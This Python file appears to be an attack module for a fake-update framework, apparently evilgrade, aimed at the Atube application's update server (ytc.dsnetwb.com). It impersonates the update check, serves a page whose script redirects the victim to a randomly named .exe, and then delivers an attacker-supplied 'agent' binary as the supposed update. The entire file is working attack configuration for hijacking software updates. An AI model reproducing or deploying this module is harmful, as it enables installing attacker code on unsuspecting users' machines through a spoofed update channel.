from modules import ModuleBase


class Atube(ModuleBase):
    name = 'Atube'
    version = '1.0'
    appver = '<1.0.300'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = '(ytc.dsnetwb.com)' 
    requests = [
        {   'path': '/ytc_update.php\?item\=check',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/atube/ytc.php',
        },
        {   'path': '/ytc_update.php',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://ytc.dsnetwb.com/atube<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },

        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
